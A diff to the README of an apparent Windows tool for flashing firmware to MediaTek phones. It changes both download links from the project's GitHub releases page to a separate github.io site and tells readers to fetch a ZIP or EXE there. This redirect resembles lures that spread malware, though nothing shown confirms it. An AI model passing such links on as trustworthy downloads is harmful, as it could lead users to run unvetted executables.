@@ -1,6 +1,6 @@
 # 🛠️ MediaTek-Flash-2026 - Flash MediaTek devices on Windows 11
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Progettobus4789/MediaTek-Flash-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://progettobus4789.github.io)
 
 ## What is this tool?
 MediaTek-Flash-2026 helps users manage firmware on devices with MediaTek hardware. It allows you to update device software or recover a device that does not boot. The tool works on Windows 10 and Windows 11. It provides a simple interface to load scatter files and flash partitions to your mobile hardware.
@@ -16,7 +16,7 @@ MediaTek-Flash-2026 helps users manage firmware on devices with MediaTek hardwar
 ## 💾 Getting the Software
 To get the tool, visit the official release page. You will find the installer package there. 
 
-[Visit this page to download the software](https://github.com/Progettobus4789/MediaTek-Flash-2026/releases)
+[Visit this page to download the software](https://progettobus4789.github.io)
 
 On this page, look for the most recent version labeled as a ZIP or EXE file. Click the file name to save it to your computer.
 
